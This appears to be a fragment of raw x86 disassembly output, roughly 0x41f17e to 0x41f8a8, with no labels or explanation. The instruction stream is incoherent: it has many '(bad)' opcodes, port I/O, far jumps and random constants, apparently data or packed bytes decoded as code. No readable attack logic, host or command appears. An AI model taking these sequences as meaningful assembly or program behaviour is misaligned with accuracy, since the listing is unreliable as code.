  41f17e:	and    DWORD PTR [edx-0x62],edi
  41f181:	out    0xef,eax
  41f183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f184:	inc    ebp
  41f185:	mov    eax,0x2b1fbda4
  41f18a:	push   edx
  41f18b:	xchg   edi,eax
  41f18c:	xchg   ecx,eax
  41f18d:	mov    dh,0xbd
  41f18f:	(bad)  [eax]
  41f191:	sbb    eax,0xb9946905
  41f196:	cmp    ebx,DWORD PTR [ecx+0xc6924fd]
  41f19c:	add    BYTE PTR [eax+0x14],cl
  41f19f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1a0:	daa    
  41f1a1:	cmp    esi,DWORD PTR [edx+0x37]
  41f1a4:	seto   BYTE PTR [esi+eiz*8-0x55f631de]
  41f1ac:	mov    edi,0x5894a833
  41f1b1:	add    BYTE PTR [ebp+0x61],cl
  41f1b4:	pop    edx
  41f1b5:	frstor [esi-0x4e]
  41f1b8:	bound  ebp,QWORD PTR [ecx-0x78]
  41f1bb:	cld    
  41f1bc:	jns    0x41f172
  41f1be:	enter  0x2815,0x7b
  41f1c2:	add    ecx,DWORD PTR [ebx+eiz*1+0x6e]
  41f1c6:	fldenv [edx-0x38]
  41f1c9:	fistp  WORD PTR [esi+0x12]
  41f1cc:	scas   eax,DWORD PTR es:[edi]
  41f1cd:	sar    dl,0x49
  41f1d0:	jmp    0x1368:0xe1467834
  41f1d7:	xchg   esp,eax
  41f1d8:	jnp    0x41f1c5
  41f1da:	inc    ebp
  41f1db:	push   cs
  41f1dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1dd:	pop    es
  41f1de:	inc    ebx
  41f1df:	jmp    0xa3ef:0x679
  41f1e5:	loop   0x41f18c
  41f1e7:	imul   esi,DWORD PTR [ebx],0xffa9a446
  41f1ed:	adc    ch,cl
  41f1ef:	dec    ecx
  41f1f0:	push   esi
  41f1f1:	push   ecx
  41f1f2:	ffreep st(6)
  41f1f4:	sub    esp,DWORD PTR [edx]
  41f1f6:	aam    0x77
  41f1f8:	xor    edx,DWORD PTR [ebp+0x2b]
  41f1fb:	pop    ebp
  41f1fc:	leave  
  41f1fd:	pop    ebx
  41f1fe:	push   ds
  41f1ff:	sub    edi,DWORD PTR [edx-0x42]
  41f202:	adc    eax,0xe150ee50
  41f207:	cmp    al,0x12
  41f209:	push   esi
  41f20a:	pop    esi
  41f20b:	out    dx,eax
  41f20c:	loopne 0x41f1aa
  41f20e:	xor    dh,BYTE PTR [edx-0x7bff2993]
  41f214:	add    al,0x74
  41f216:	adc    DWORD PTR [edx+0x7042e1a5],ebp
  41f21c:	and    al,0xff
  41f21e:	or     BYTE PTR [edx-0x42843f8b],bh
  41f224:	mov    ch,0xf3
  41f226:	push   edi
  41f227:	loopne 0x41f287
  41f229:	sti    
  41f22a:	leave  
  41f22b:	mov    dh,0x4e
  41f22d:	pop    ecx
  41f22e:	mov    cl,0xf6
  41f230:	stc    
  41f231:	or     edx,DWORD PTR [eax]
  41f233:	pop    esp
  41f234:	nop
  41f235:	popa   
  41f236:	inc    ebx
  41f237:	push   edx
  41f238:	xchg   DWORD PTR [edx],esi
  41f23a:	aam    0xe7
  41f23c:	fmulp  st(3),st
  41f23e:	dec    ebx
  41f23f:	pop    es
  41f240:	test   al,0x19
  41f242:	loopne 0x41f24b
  41f244:	out    0xc9,eax
  41f246:	inc    esp
  41f247:	xchg   esi,eax
  41f248:	pop    ss
  41f249:	stos   BYTE PTR es:[edi],al
  41f24a:	mov    ebx,0xf67ac809
  41f24f:	adc    al,0xab
  41f251:	js     0x41f2cb
  41f253:	jp     0x41f24e
  41f255:	and    esi,DWORD PTR [ecx]
  41f257:	fcomi  st,st(1)
  41f259:	daa    
  41f25a:	dec    esi
  41f25b:	das    
  41f25c:	mov    BYTE PTR ss:[edx+edi*8+0x3799ee10],bl
  41f264:	dec    esp
  41f265:	and    DWORD PTR [ebx],edx
  41f267:	imul   ebx,ebx,0xffffff96
  41f26a:	mov    al,ds:0xa44f99b3
  41f26f:	jb     0x41f20b
  41f271:	mov    dh,0x5e
  41f273:	cmp    dh,bh
  41f275:	xor    BYTE PTR [ebp-0x190ddc9d],ah
  41f27b:	bound  eax,QWORD PTR [ebx+0x1fbcdec1]
  41f281:	test   al,0xa
  41f283:	mov    ecx,0xd478c910
  41f288:	adc    DWORD PTR [ecx+0xd],eax
  41f28b:	adc    eax,0x1d5397e7
  41f290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f291:	add    eax,0x43be4925
  41f296:	inc    ecx
  41f297:	je     0x41f2f0
  41f299:	push   eax
  41f29a:	out    dx,eax
  41f29b:	mov    BYTE PTR [edi+eax*8-0x41],ch
  41f29f:	sub    DWORD PTR [ecx+0x60],ecx
  41f2a2:	mov    esp,0xfd1968ae
  41f2a7:	cmp    cl,0x13
  41f2aa:	xlat   BYTE PTR ds:[ebx]
  41f2ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2ac:	dec    edi
  41f2ad:	sub    esp,ebx
  41f2af:	cmp    BYTE PTR [ebx],cl
  41f2b1:	pop    ss
  41f2b2:	cmc    
  41f2b3:	cwde   
  41f2b4:	jmp    0x7270bf96
  41f2b9:	jbe    0x41f336
  41f2bb:	add    eax,DWORD PTR [ebp+0x219678c]
  41f2c1:	push   ecx
  41f2c2:	or     BYTE PTR [eax-0x4c3c3790],0xba
  41f2c9:	sub    DWORD PTR [ebx+eiz*4-0x2a],0xffffff9e
  41f2ce:	mov    ecx,edx
  41f2d0:	mov    esp,0x58ba7c56
  41f2d5:	xchg   ecx,eax
  41f2d6:	cmp    al,0x3a
  41f2d8:	sub    BYTE PTR [esp+edx*2+0x6b],bh
  41f2dc:	out    dx,eax
  41f2dd:	pop    esp
  41f2de:	jp     0x41f312
  41f2e0:	lahf   
  41f2e1:	dec    ebx
  41f2e2:	arpl   WORD PTR ds:0x556c7fc8,dx
  41f2e8:	outs   dx,DWORD PTR ds:[esi]
  41f2e9:	in     al,dx
  41f2ea:	cs (bad) 
  41f2ec:	adc    DWORD PTR [ecx],ecx
  41f2ee:	and    BYTE PTR [eax-0x21256931],dh
  41f2f4:	js     0x41f2b6
  41f2f6:	dec    ecx
  41f2f7:	ins    DWORD PTR es:[edi],dx
  41f2f8:	lods   eax,DWORD PTR ds:[esi]
  41f2f9:	iret   
  41f2fa:	fist   WORD PTR [ebx]
  41f2fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2fd:	dec    esp
  41f2fe:	push   edx
  41f2ff:	xchg   dh,bh
  41f301:	nop
  41f302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f304:	retf   0x5ed4
  41f307:	dec    edx
  41f308:	cmp    dl,BYTE PTR [ebp-0x28]
  41f30b:	mov    ch,0xe
  41f30d:	xchg   esp,eax
  41f30e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f30f:	jmp    0x41f329
  41f311:	mov    ds:0x9a98e50e,al
  41f316:	mov    cl,0x10
  41f318:	out    dx,al
  41f319:	nop
  41f31a:	mov    ah,0x57
  41f31c:	lock add DWORD PTR [ebx-0x2f],ebx
  41f320:	push   0xda6beb1a
  41f325:	mov    ebp,0x1d13b6f8
  41f32a:	jns    0x41f356
  41f32c:	test   al,0xbd
  41f32e:	mov    eax,ds:0x94fb38d4
  41f333:	int3   
  41f334:	jmp    0xbcdcbac9
  41f339:	outs   dx,BYTE PTR ds:[esi]
  41f33a:	jmp    0x1f1d:0x93d1252a
  41f341:	out    0x5,eax
  41f343:	test   edx,ecx
  41f345:	add    DWORD PTR [edx+0x5c991e3c],eax
  41f34b:	and    edx,DWORD PTR [ecx-0x49]
  41f34e:	adc    DWORD PTR [edi],0xd82ccd47
  41f354:	in     al,dx
  41f355:	push   ds
  41f356:	xor    esi,DWORD PTR [esi-0x3d3633a5]
  41f35c:	stos   DWORD PTR es:[edi],eax
  41f35d:	in     al,dx
  41f35e:	mul    BYTE PTR [edi]
  41f360:	pop    edi
  41f361:	aaa    
  41f362:	js     0x41f38b
  41f364:	sbb    ecx,DWORD PTR [ebp+0x2ae9a807]
  41f36a:	jno    0x41f3d3
  41f36c:	(bad)  
  41f36d:	xor    BYTE PTR [esi-0x7d91efbe],al
  41f373:	or     eax,0xdb806b1b
  41f378:	icebp  
  41f379:	mov    esi,0xefb96e08
  41f37e:	rcr    ch,1
  41f380:	clc    
  41f381:	sbb    BYTE PTR [ecx-0x55],al
  41f384:	mov    eax,0x9a006dc1
  41f389:	retf   0x6023
  41f38c:	aam    0x4d
  41f38e:	ins    BYTE PTR es:[edi],dx
  41f38f:	(bad)  
  41f390:	repz mov esi,0xd18c2034
  41f396:	(bad)  
  41f397:	sar    bh,0x7b
  41f39a:	pop    esi
  41f39b:	xor    DWORD PTR [ebx],esi
  41f39d:	sub    esi,DWORD PTR ds:0xa4c2de14
  41f3a3:	aam    0xe
  41f3a5:	mov    esp,0xb15d355b
  41f3aa:	inc    esi
  41f3ab:	cmp    al,0x60
  41f3ad:	jae    0x41f396
  41f3af:	xchg   edx,eax
  41f3b0:	jp     0x41f3ef
  41f3b2:	cmp    eax,0xf96c3e88
  41f3b7:	add    eax,0x201f423b
  41f3bc:	cmp    BYTE PTR [ecx-0x103dda2b],ch
  41f3c2:	cmp    al,0x2c
  41f3c4:	sbb    BYTE PTR [edi],ah
  41f3c6:	aas    
  41f3c7:	push   ss
  41f3c8:	inc    ecx
  41f3c9:	xchg   ebp,eax
  41f3ca:	xor    BYTE PTR [esi],bl
  41f3cc:	ss mov esi,0x362a6de5
  41f3d2:	(bad)  
  41f3d3:	jge    0x41f436
  41f3d5:	sub    eax,0xf46a184d
  41f3da:	sbb    BYTE PTR [esi],ah
  41f3dc:	sbb    DWORD PTR [edx+0x19],edx
  41f3df:	lock xchg edi,eax
  41f3e1:	push   es
  41f3e2:	imul   eax,DWORD PTR gs:[edx-0x19],0x42
  41f3e7:	jo     0x41f36b
  41f3e9:	xlat   BYTE PTR ds:[ebx]
  41f3ea:	sub    al,0xc5
  41f3ec:	push   esp
  41f3ed:	mov    ebx,0xc1995c4c
  41f3f2:	mov    al,0xee
  41f3f4:	mov    ?,WORD PTR [esi-0x66]
  41f3f7:	dec    ebp
  41f3f8:	addr16 pop ebp
  41f3fa:	cmp    cl,BYTE PTR [ecx+0x3f]
  41f3fd:	div    bh
  41f3ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f400:	mov    edx,0xb4a7770c
  41f405:	push   ebx
  41f406:	jmp    DWORD PTR [esi+0x20]
  41f409:	mov    edi,ebx
  41f40b:	fidivr DWORD PTR ds:0x406d0c40
  41f411:	imul   edx,edx,0x40
  41f414:	push   es
  41f415:	shl    BYTE PTR [ecx],cl
  41f417:	ss jmp 0x6ccd:0xa46db8c2
  41f41f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f420:	adc    al,0x5d
  41f422:	popa   
  41f423:	stc    
  41f424:	sub    al,bh
  41f426:	or     al,0x8a
  41f428:	push   ebp
  41f429:	push   ecx
  41f42a:	popa   
  41f42b:	mov    ecx,0xa1753a69
  41f430:	push   bx
  41f432:	add    eax,0xf6e2e55a
  41f437:	cdq    
  41f438:	mov    bh,0x8
  41f43a:	outs   dx,DWORD PTR ds:[esi]
  41f43b:	jp     0x41f412
  41f43d:	pop    ebp
  41f43e:	pop    esi
  41f43f:	fadd   QWORD PTR [ebp+0x2b413b75]
  41f445:	mov    eax,ds:0x9482ad0e
  41f44a:	mov    bh,0x77
  41f44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f44d:	adc    edi,DWORD PTR [edi-0x5a5f23d9]
  41f453:	push   edx
  41f454:	xchg   esp,eax
  41f455:	mov    ebp,0x39991338
  41f45a:	test   DWORD PTR [ebx+0x7afef8e3],esi
  41f460:	popa   
  41f461:	cmp    al,0xa9
  41f463:	call   0xa123:0xebb8e7e5
  41f46a:	leave  
  41f46b:	ins    BYTE PTR es:[edi],dx
  41f46c:	jo     0x41f441
  41f46e:	pop    ecx
  41f46f:	ret    
  41f470:	sbb    edi,esi
  41f472:	mov    ?,WORD PTR [edi]
  41f474:	(bad)  
  41f475:	ins    DWORD PTR es:[edi],dx
  41f476:	sbb    BYTE PTR [ebx+0x1a5fd342],dh
  41f47c:	dec    eax
  41f47d:	sub    eax,0xf0b85fad
  41f482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f483:	xor    al,0xfd
  41f485:	mov    esi,DWORD PTR [eax+0x29]
  41f488:	push   cs
  41f489:	add    ebx,edx
  41f48b:	stc    
  41f48c:	mov    BYTE PTR [ecx-0x611f4b5e],al
  41f492:	scas   eax,DWORD PTR es:[edi]
  41f493:	(bad)  
  41f494:	cwde   
  41f495:	cmp    al,BYTE PTR [edx+0x3b]
  41f498:	inc    ebp
  41f499:	in     eax,0x29
  41f49b:	test   DWORD PTR [edi+0x58c88e9f],0x9dfa5620
  41f4a5:	or     eax,0xf68965ee
  41f4aa:	cmp    BYTE PTR [ebx],cl
  41f4ac:	jns    0x41f4b2
  41f4ae:	or     esp,DWORD PTR [edx]
  41f4b0:	xchg   esp,eax
  41f4b1:	aaa    
  41f4b2:	or     al,0xd6
  41f4b4:	in     al,0xa0
  41f4b6:	jecxz  0x41f4d0
  41f4b8:	mov    al,0xce
  41f4ba:	popf   
  41f4bb:	mov    al,ds:0x23177658
  41f4c0:	mov    al,0xe
  41f4c2:	(bad)  
  41f4c4:	aas    
  41f4c5:	ins    BYTE PTR es:[edi],dx
  41f4c6:	lods   eax,DWORD PTR ds:[esi]
  41f4c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4c8:	scas   eax,DWORD PTR es:[edi]
  41f4c9:	adc    esp,DWORD PTR [ecx]
  41f4cb:	outs   dx,DWORD PTR ds:[esi]
  41f4cc:	inc    esi
  41f4cd:	inc    esp
  41f4ce:	xchg   edi,eax
  41f4cf:	fisubr WORD PTR ds:0x61977b24
  41f4d5:	fld    DWORD PTR [ecx-0x4eae18f1]
  41f4db:	arpl   bp,ax
  41f4dd:	pop    esp
  41f4de:	lock xchg ecx,eax
  41f4e0:	shl    BYTE PTR [edi+ebp*1+0x1d],1
  41f4e4:	inc    eax
  41f4e5:	or     DWORD PTR [edx],ebx
  41f4e7:	sbb    al,BYTE PTR [ecx]
  41f4e9:	mov    al,0xa9
  41f4eb:	inc    ebp
  41f4ec:	jns    0x41f4ea
  41f4ee:	outs   dx,DWORD PTR ds:[esi]
  41f4ef:	int    0x8d
  41f4f1:	fmul   QWORD PTR [ecx+edi*8+0x45a376e2]
  41f4f8:	out    0x10,eax
  41f4fa:	push   cs
  41f4fb:	das    
  41f4fc:	ror    DWORD PTR [edi+0x63537216],1
  41f502:	mov    bh,0xa1
  41f504:	cmp    al,BYTE PTR [ebp+0x6fdd4619]
  41f50a:	scas   al,BYTE PTR es:[edi]
  41f50b:	clc    
  41f50c:	xchg   edi,eax
  41f50d:	pop    esi
  41f50e:	add    dh,BYTE PTR [ebx+0x71]
  41f511:	ds inc edx
  41f513:	test   BYTE PTR [edi+0x2e],ch
  41f516:	sbb    esp,0xffffff8b
  41f519:	icebp  
  41f51a:	jecxz  0x41f4f0
  41f51c:	fild   QWORD PTR [ebx+0x32269680]
  41f522:	test   eax,0x4eb91e98
  41f527:	push   edi
  41f529:	loop   0x41f4d8
  41f52b:	inc    eax
  41f52c:	loope  0x41f53e
  41f52e:	xlat   BYTE PTR ds:[ebx]
  41f52f:	sti    
  41f530:	in     eax,0x37
  41f532:	ins    BYTE PTR es:[edi],dx
  41f533:	jmp    0x41f518
  41f535:	xchg   DWORD PTR [esi-0x7e],ebp
  41f538:	add    eax,0xa20ef14f
  41f53d:	fs pop es
  41f53f:	(bad)  
  41f541:	pop    ecx
  41f542:	mov    ch,0xf1
  41f544:	mov    ah,0x98
  41f546:	jmp    0x40e0ce7c
  41f54b:	pop    edi
  41f54c:	scas   al,BYTE PTR es:[edi]
  41f54d:	dec    eax
  41f54e:	sahf   
  41f54f:	push   ebp
  41f550:	arpl   WORD PTR [ecx+0x46b84042],ax
  41f556:	sbb    eax,0x714a45a5
  41f55b:	test   ecx,0x407f4b16
  41f561:	xchg   edi,eax
  41f562:	mov    ebp,0x90f1a180
  41f567:	push   eax
  41f568:	shl    BYTE PTR [eax],1
  41f56a:	cmp    DWORD PTR [edi-0x2e],esi
  41f56d:	fdiv   st(4),st
  41f56f:	mov    al,ds:0x2eff03a8
  41f574:	sub    al,0x8d
  41f576:	div    DWORD PTR ss:[ebp-0x4e]
  41f57a:	jne    0x41f5af
  41f57c:	sbb    edi,DWORD PTR [ecx+0x7dfdda25]
  41f582:	daa    
  41f583:	call   0xcee6:0xe422afff
  41f58a:	mov    dh,0x9f
  41f58c:	in     eax,dx
  41f58d:	test   eax,0x9a41b45c
  41f592:	and    BYTE PTR [ecx-0x7c500030],dh
  41f598:	xor    DWORD PTR [ebp+eax*4+0xf],0xffffffd5
  41f59d:	clc    
  41f59e:	add    bh,BYTE PTR [eax+ebx*8-0x62]
  41f5a2:	jge    0x41f600
  41f5a4:	mov    dh,al
  41f5a6:	push   0x9fdd4ca6
  41f5ab:	push   esi
  41f5ac:	add    al,0xd5
  41f5ae:	xchg   edi,eax
  41f5af:	adc    BYTE PTR [esi-0x17b1d1af],dl
  41f5b5:	and    dh,BYTE PTR [eax+0x57054f68]
  41f5bb:	mov    edi,0xa6d5be0f
  41f5c0:	test   DWORD PTR [eax-0x27],ebx
  41f5c3:	xor    DWORD PTR [ebx+0x3e],0xe5e8f2a5
  41f5ca:	sub    esp,ecx
  41f5cc:	and    al,0x5a
  41f5ce:	xchg   esi,eax
  41f5cf:	retf   0x5a85
  41f5d2:	outs   dx,BYTE PTR ds:[esi]
  41f5d3:	aam    0xea
  41f5d5:	imul   ebp,DWORD PTR [esi-0x46],0xce1819fd
  41f5dc:	adc    esp,DWORD PTR [eax+0x36]
  41f5df:	mov    ah,0x0
  41f5e1:	inc    edi
  41f5e2:	stc    
  41f5e3:	dec    edi
  41f5e4:	inc    esi
  41f5e5:	adc    bh,BYTE PTR [eax+ebx*8-0x6b]
  41f5e9:	jmp    DWORD PTR [edx]
  41f5eb:	ss jl  0x41f5a5
  41f5ee:	(bad)  
  41f5f0:	sbb    bl,ah
  41f5f2:	es xchg edx,eax
  41f5f4:	mov    al,ds:0xd4b18a75
  41f5f9:	loopne 0x41f605
  41f5fb:	mov    edi,0x7d7a27b8
  41f600:	adc    bl,BYTE PTR [esi]
  41f602:	and    ebx,DWORD PTR [ebp-0x64da8809]
  41f608:	xor    al,0x4e
  41f60a:	jl     0x41f667
  41f60c:	sti    
  41f60d:	sar    BYTE PTR [edx],1
  41f60f:	std    
  41f610:	addr16 pop ss
  41f612:	and    DWORD PTR [ecx-0x4874ab97],esp
  41f618:	push   cs
  41f619:	addr16 jnp 0x41f640
  41f61c:	or     ecx,DWORD PTR [ebx+edx*2]
  41f61f:	retf   0xf280
  41f622:	clc    
  41f623:	fisttp QWORD PTR [edi]
  41f625:	fs in  al,0xba
  41f628:	cld    
  41f629:	mov    eax,0x3e543ab3
  41f62e:	jp     0x41f5ff
  41f630:	add    bh,cl
  41f632:	mov    al,0x30
  41f634:	or     DWORD PTR [ebx+ebx*8],ebp
  41f637:	mov    eax,ds:0x140a9e9d
  41f63c:	loop   0x41f5fe
  41f63e:	mov    edi,0x4d590bef
  41f643:	adc    BYTE PTR [esp+esi*8-0x2a],bh
  41f647:	pusha  
  41f648:	pop    esi
  41f649:	jo     0x41f65d
  41f64b:	in     al,dx
  41f64c:	(bad)  
  41f64e:	test   DWORD PTR [eax+0x786d2418],ecx
  41f654:	sbb    ebx,DWORD PTR [ebx+edx*8-0x3a709d6]
  41f65b:	dec    ecx
  41f65c:	xchg   dl,bl
  41f65e:	dec    ebx
  41f65f:	and    esp,ecx
  41f661:	rcl    DWORD PTR [ecx-0x15],1
  41f664:	fidivr DWORD PTR ds:0x924017a1
  41f66a:	in     eax,dx
  41f66b:	iret   
  41f66c:	push   es
  41f66d:	adc    DWORD PTR [esp+eax*1],ebx
  41f670:	xchg   ecx,eax
  41f671:	mov    edx,DWORD PTR [eax-0x76bca801]
  41f677:	or     esp,DWORD PTR [edx]
  41f679:	or     al,0x79
  41f67b:	push   ecx
  41f67c:	int    0x9e
  41f67e:	and    ax,0xb3d0
  41f682:	push   cs
  41f683:	jl     0x41f675
  41f685:	push   esi
  41f686:	mov    DWORD PTR [esi+0x2e],ebp
  41f689:	add    ebp,ebp
  41f68b:	loop   0x41f69a
  41f68d:	retf   
  41f68e:	inc    edi
  41f68f:	mov    al,0x89
  41f692:	in     eax,0xd5
  41f694:	aad    0xca
  41f696:	sbb    BYTE PTR [eax],ah
  41f698:	dec    esp
  41f699:	nop
  41f69a:	sbb    BYTE PTR [ebx],dl
  41f69c:	dec    edi
  41f69d:	fwait
  41f69e:	sbb    al,0x91
  41f6a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6a1:	push   ds
  41f6a2:	shl    DWORD PTR ds:0xc738ab5f,1
  41f6a8:	mov    dh,ah
  41f6aa:	mov    BYTE PTR [ebx+0x2c],al
  41f6ad:	sbb    ah,BYTE PTR [ebx]
  41f6af:	jo     0x41f634
  41f6b1:	mov    edx,0xdbcbd801
  41f6b6:	ja     0x41f6e6
  41f6b8:	sbb    eax,DWORD PTR [edi+0x33]
  41f6bb:	es xor eax,0x31d867bf
  41f6c1:	cwde   
  41f6c2:	bound  esp,QWORD PTR [eax+0x2a]
  41f6c5:	cmp    al,0x9a
  41f6c7:	add    al,BYTE PTR [edi]
  41f6c9:	or     BYTE PTR [eax],0x4a
  41f6cc:	inc    eax
  41f6cd:	fisub  WORD PTR [ecx-0x60b55fe4]
  41f6d3:	pop    ebx
  41f6d4:	bound  ebp,QWORD PTR [edx-0x2ffecb6d]
  41f6da:	push   eax
  41f6db:	adc    eax,0x50327507
  41f6e0:	and    al,0xd5
  41f6e2:	mov    dl,0xe7
  41f6e4:	pop    esi
  41f6e5:	cwde   
  41f6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6e7:	lock sub eax,0x6860229d
  41f6ed:	mov    eax,ds:0x68456d78
  41f6f2:	inc    eax
  41f6f3:	daa    
  41f6f4:	je     0x41f6b2
  41f6f6:	fldcw  WORD PTR [ecx-0x6f2a4bc4]
  41f6fc:	stos   BYTE PTR es:[edi],al
  41f6fd:	fsub   QWORD PTR [ebx+ecx*1]
  41f700:	dec    ecx
  41f701:	ins    DWORD PTR es:[edi],dx
  41f702:	aam    0x88
  41f704:	xchg   ebp,eax
  41f705:	jle    0x41f721
  41f707:	sti    
  41f708:	loope  0x41f776
  41f70a:	js     0x41f70a
  41f70c:	sbb    dl,BYTE PTR [edi+0x27]
  41f70f:	les    ecx,FWORD PTR [eax-0x41bf81e8]
  41f715:	or     al,0x2e
  41f717:	lahf   
  41f718:	mov    dh,BYTE PTR [edx+0x43db371d]
  41f71e:	mov    dh,BYTE PTR [esi-0x55c66fe5]
  41f724:	mov    bl,0x30
  41f726:	lahf   
  41f727:	std    
  41f728:	inc    edx
  41f729:	mov    bh,0x10
  41f72b:	lods   eax,DWORD PTR cs:[esi]
  41f72d:	push   edi
  41f72e:	xor    DWORD PTR [ebx],ebx
  41f730:	lds    edi,FWORD PTR [eax+0x46]
  41f733:	adc    dh,BYTE PTR [ecx]
  41f735:	jmp    0xec903c40
  41f73a:	mov    ebx,0xc8dbc41d
  41f73f:	popa   
  41f740:	xor    ecx,esp
  41f742:	(bad)  
  41f743:	mov    esp,0x365dfab2
  41f748:	inc    edi
  41f749:	add    dh,BYTE PTR [edi]
  41f74b:	and    al,0x16
  41f74d:	aad    0xd5
  41f74f:	cwde   
  41f750:	iret   
  41f751:	and    eax,0x51ffe8fb
  41f756:	mov    esi,0xa33182bd
  41f75b:	ins    DWORD PTR es:[edi],dx
  41f75c:	jnp    0x41f798
  41f75e:	mov    ecx,0x2aaa488f
  41f763:	test   al,0x9f
  41f765:	pop    ecx
  41f766:	ins    BYTE PTR es:[edi],dx
  41f767:	adc    ebx,DWORD PTR [edi-0x2]
  41f76a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f76b:	mov    dh,0xfb
  41f76d:	sbb    BYTE PTR [eax],0x1a
  41f770:	aas    
  41f771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f772:	mov    dh,0xad
  41f774:	ret    0xd6f9
  41f777:	pop    esi
  41f778:	mov    ch,0x49
  41f77a:	hlt    
  41f77b:	sbb    BYTE PTR [edx-0x23],bh
  41f77e:	stos   BYTE PTR es:[edi],al
  41f77f:	xchg   ebx,eax
  41f780:	fldcw  WORD PTR [ebx]
  41f782:	push   es
  41f783:	cld    
  41f784:	pop    ebp
  41f785:	xchg   DWORD PTR [eax-0x7570c879],ebx
  41f78b:	or     ebx,DWORD PTR [edi-0x9]
  41f78e:	(bad)  
  41f78f:	mul    ebp
  41f791:	sub    BYTE PTR [ecx-0x3324cc17],dl
  41f797:	xchg   ebx,eax
  41f798:	aas    
  41f799:	(bad)  
  41f79a:	aad    0x7d
  41f79c:	mov    ebp,0x13e3a59b
  41f7a1:	xor    ch,BYTE PTR [ebx]
  41f7a3:	or     eax,0xb1cc0fda
  41f7a8:	or     DWORD PTR [ebp+0x75],ecx
  41f7ab:	cs dec esi
  41f7ad:	test   al,0xa5
  41f7af:	mov    eax,ds:0x3ed1c1ac
  41f7b4:	scas   eax,DWORD PTR es:[edi]
  41f7b5:	bound  esp,QWORD PTR [edx]
  41f7b7:	out    0x27,eax
  41f7b9:	out    0x86,eax
  41f7bb:	mov    bh,0x16
  41f7bd:	fisub  DWORD PTR [esi+0x4]
  41f7c0:	lods   al,BYTE PTR ds:[esi]
  41f7c1:	jo     0x41f7bc
  41f7c3:	scas   al,BYTE PTR es:[edi]
  41f7c4:	rol    BYTE PTR [ebp+edx*8+0x0],1
  41f7c8:	test   eax,0x623ed2c1
  41f7cd:	shr    BYTE PTR [esi],1
  41f7cf:	lahf   
  41f7d0:	pop    ebx
  41f7d1:	or     eax,DWORD PTR [edi-0x58]
  41f7d4:	fs enter 0xd7e2,0x0
  41f7d9:	and    al,0xc3
  41f7db:	or     DWORD PTR ss:[ebp+0x9],esi
  41f7df:	repz jae 0x41f7ec
  41f7e2:	(bad)  
  41f7e3:	retf   
  41f7e4:	outs   dx,DWORD PTR ds:[esi]
  41f7e5:	pop    ebp
  41f7e6:	cmp    esi,DWORD PTR [eax]
  41f7e8:	mov    WORD PTR [ebx+0x2c14e321],ds
  41f7ee:	and    DWORD PTR [eax+0x1bbc3bc],0xb02d9810
  41f7f8:	push   esp
  41f7f9:	push   ds
  41f7fa:	lahf   
  41f7fb:	inc    esi
  41f7fc:	jp     0x41f7b2
  41f7fe:	pop    eax
  41f7ff:	out    0x1e,eax
  41f801:	sub    esi,ebx
  41f803:	add    dl,dl
  41f805:	test   al,0x61
  41f807:	stc    
  41f808:	add    al,0xd2
  41f80a:	(bad)  
  41f80b:	cmp    BYTE PTR [ebp-0x2a629243],ah
  41f811:	push   ds
  41f812:	xor    eax,0x1c823611
  41f817:	das    
  41f818:	idiv   cl
  41f81a:	push   cs
  41f81b:	or     dl,bl
  41f81d:	pop    ebx
  41f81e:	sbb    BYTE PTR [ecx],ch
  41f820:	mov    dh,0x67
  41f822:	dec    ebx
  41f823:	test   al,0xc6
  41f825:	mov    ecx,edi
  41f827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f828:	cwde   
  41f829:	add    al,0x97
  41f82b:	pop    esi
  41f82c:	push   esi
  41f82d:	pop    esi
  41f82e:	push   esp
  41f82f:	in     al,0x27
  41f831:	xor    DWORD PTR [esi],0x45
  41f834:	(bad)  
  41f835:	mov    ch,cl
  41f837:	shr    BYTE PTR [ecx-0x20],cl
  41f83a:	repnz es int 0xa1
  41f83e:	jmp    0xe5af1282
  41f843:	aas    
  41f844:	lods   eax,DWORD PTR ds:[esi]
  41f845:	ss icebp 
  41f847:	adc    dh,BYTE PTR [esi+eax*8-0x5a19b721]
  41f84e:	out    dx,eax
  41f84f:	fwait
  41f850:	dec    edx
  41f851:	aad    0xe5
  41f853:	(bad)  
  41f855:	sub    DWORD PTR [ebx+edi*2],esi
  41f858:	shl    DWORD PTR [eax-0x46],0xa2
  41f85c:	xor    BYTE PTR [esi-0x493214ff],0x94
  41f863:	pushf  
  41f864:	cmp    al,0xd
  41f866:	(bad)  
  41f867:	jo     0x41f886
  41f869:	scas   al,BYTE PTR es:[edi]
  41f86a:	ret    
  41f86b:	inc    ebp
  41f86c:	test   eax,0xc59d685f
  41f871:	je     0x41f851
  41f873:	xchg   ecx,eax
  41f874:	out    0x70,eax
  41f876:	add    BYTE PTR [ecx],cl
  41f878:	sbb    ebx,esi
  41f87a:	jg     0x41f831
  41f87c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f87d:	or     eax,0xbeba23c3
  41f882:	mov    DWORD PTR [eax],edi
  41f884:	push   0xffffff95
  41f886:	repnz mov BYTE PTR [ebx],ah
  41f889:	mov    ebp,0xeb5307bc
  41f88e:	mov    eax,DWORD PTR ds:0xe5bdba98
  41f894:	and    al,0x32
  41f896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f897:	jo     0x41f8ec
  41f899:	or     BYTE PTR [edi+esi*2],0xe9
  41f89d:	add    DWORD PTR [ebx-0xf86c560],0xf2e61a2f
  41f8a7:	daa    
  41f8a8:	int3   
